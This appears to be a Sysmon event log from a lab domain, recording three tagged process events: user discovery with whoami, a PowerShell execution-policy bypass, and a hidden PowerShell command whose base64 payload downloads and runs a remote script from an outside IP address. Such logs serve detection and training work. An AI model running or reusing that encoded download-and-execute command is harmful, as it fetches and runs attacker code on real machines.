<?xml version="1.0" encoding="UTF-8"?>
<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
<Event>
   <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:11.8573590Z" />
      <EventRecordID>4942</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
   </System>
   <EventData>
      <Data Name="RuleName">technique_id=T1033,technique_name=System Owner/User Discovery</Data>
      <Data Name="UtcTime">2024-12-01 16:05:11.850</Data>
      <Data Name="ProcessGuid">{f3565dc0-8937-674c-7801-000000000c00}</Data>
      <Data Name="ProcessId">9388</Data>
      <Data Name="Image">C:\Windows\System32\whoami.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">whoami - displays logged on user information</Data>
      <Data Name="Product">Microsoft® Windows® Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">whoami.exe</Data>
      <Data Name="CommandLine">whoami  /groups</Data>
      <Data Name="CurrentDirectory">C:\Users\administrator\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=C23488BA47972B04F795D34B35C8257EC4B7AC9D,MD5=956692DADC5B2CEB46E9219F7A5BEFFA,SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3,IMPHASH=E4464BCD92DF7AC69CCD074CB9C0EFED</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
      <Data Name="ParentProcessId">6124</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
   </EventData>
</Event>
<Event>
   <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:22.4127310Z" />
      <EventRecordID>4955</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
   </System>
   <EventData>
      <Data Name="RuleName">technique_id=T1059.001,technique_name=PowerShell</Data>
      <Data Name="UtcTime">2024-12-01 16:05:22.410</Data>
      <Data Name="ProcessGuid">{f3565dc0-893d-674c-8401-000000000c88}</Data>
      <Data Name="ProcessId">7752</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Windows PowerShell</Data>
      <Data Name="Product">Microsoft® Windows® Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">PowerShell.EXE</Data>
      <Data Name="CommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=A1E9CE0537E4E2F643B0EBED42D827A4CD9BF19A,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=E6ADF60C3B091428FD124B637B0FEE0A24CB944CB39D2A38DB3E36CA3B67AE9,IMPHASH=1D8A5F4A8B92CA6F2C0F19A1F0F8E6AF</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-8934-674c-7201-000000000c00}</Data>
      <Data Name="ParentProcessId">6124</Data>
      <Data Name="ParentImage">C:\Windows\System32\cmd.exe</Data>
      <Data Name="ParentCommandLine">"C:\WINDOWS\system32\cmd.exe"</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
   </EventData>
</Event>
<Event>
   <System>
      <Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}" />
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime="2024-12-01T16:05:29.7765480Z" />
      <EventRecordID>4967</EventRecordID>
      <Correlation />
      <Execution ProcessID="4028" ThreadID="5104" />
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>win11v.condef.local</Computer>
      <Security UserID="S-1-5-18" />
   </System>
   <EventData>
      <Data Name="RuleName">technique_id=T1027,technique_name=Obfuscated Files or Information</Data>
      <Data Name="UtcTime">2024-12-01 16:05:29.760</Data>
      <Data Name="ProcessGuid">{f3565dc0-8946-674c-9001-000000000cf4}</Data>
      <Data Name="ProcessId">8420</Data>
      <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="FileVersion">10.0.26100.1882 (WinBuild.160101.0800)</Data>
      <Data Name="Description">Windows PowerShell</Data>
      <Data Name="Product">Microsoft® Windows® Operating System</Data>
      <Data Name="Company">Microsoft Corporation</Data>
      <Data Name="OriginalFileName">PowerShell.EXE</Data>
      <Data Name="CommandLine">powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANAA1AC8AdQBwAGQAYQB0AGUALgBwAHMAMQAnACkA</Data>
      <Data Name="CurrentDirectory">C:\Windows\system32\</Data>
      <Data Name="User">CONDEF\Administrator</Data>
      <Data Name="LogonGuid">{f3565dc0-88b9-674c-6ead-160000000000}</Data>
      <Data Name="LogonId">0x16ad6e</Data>
      <Data Name="TerminalSessionId">1</Data>
      <Data Name="IntegrityLevel">High</Data>
      <Data Name="Hashes">SHA1=A1E9CE0537E4E2F643B0EBED42D827A4CD9BF19A,MD5=04029E121A0CFA5991749937DD22A1D9,SHA256=E6ADF60C3B091428FD124B637B0FEE0A24CB944CB39D2A38DB3E36CA3B67AE9,IMPHASH=1D8A5F4A8B92CA6F2C0F19A1F0F8E6AF</Data>
      <Data Name="ParentProcessGuid">{f3565dc0-893d-674c-8401-000000000c88}</Data>
      <Data Name="ParentProcessId">7752</Data>
      <Data Name="ParentImage">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name="ParentCommandLine">powershell.exe -NoProfile -ExecutionPolicy Bypass</Data>
      <Data Name="ParentUser">CONDEF\Administrator</Data>
   </EventData>
</Event>
</Events>
